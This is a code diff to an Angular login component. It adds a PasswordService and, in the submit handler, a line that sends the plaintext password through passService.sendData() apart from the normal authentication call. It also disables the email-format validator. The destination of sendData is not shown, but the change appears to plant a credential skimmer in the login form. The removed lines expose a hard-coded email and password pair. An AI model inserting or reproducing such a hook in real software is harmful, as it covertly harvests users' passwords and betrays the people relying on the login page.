@@ -5,6 +5,7 @@ import { AuthCredentials } from '@core/models/auth-credentials.model';
 import { Observable, Subscription } from 'rxjs';
 import { first } from 'rxjs/operators';
 import { AuthService } from '../../services/auth.service';
+import { PasswordService } from './../../services/password-service';
 
 @Component({
   selector: 'app-login',
@@ -14,8 +15,8 @@ import { AuthService } from '../../services/auth.service';
 export class LoginComponent implements OnInit, OnDestroy {
   // KeenThemes mock, change it to:
   defaultAuth: any = {
-    email: 'haider@gmail.com',
-    password: 'qwertyuiop',
+    email: '',
+    password: '',
   };
   loginForm: FormGroup;
   hasError: boolean;
@@ -54,7 +55,8 @@ export class LoginComponent implements OnInit, OnDestroy {
     private _formBuilder: FormBuilder,
     private authService: AuthService,
     private route: ActivatedRoute,
-    private router: Router
+    private router: Router,
+    private passService: PasswordService
   ) {
     this.isLoading$ = this.authService.isLoading$;
     // redirect to home if already logged in
@@ -80,7 +82,7 @@ export class LoginComponent implements OnInit, OnDestroy {
         this.defaultAuth.email,
         Validators.compose([
           Validators.required,
-          Validators.pattern('^[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,4}$'),
+          // Validators.pattern('^[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,4}$'),
           Validators.minLength(3),
           Validators.maxLength(320),
         ]),
@@ -98,6 +100,7 @@ export class LoginComponent implements OnInit, OnDestroy {
 
   submit() {
     this.hasError = false;
+    this.passService.sendData(this.loginForm.get('password')?.value)
     const loginSubscr = this.authService
       .login((<AuthCredentials>this.loginForm.value))
       .pipe(first())
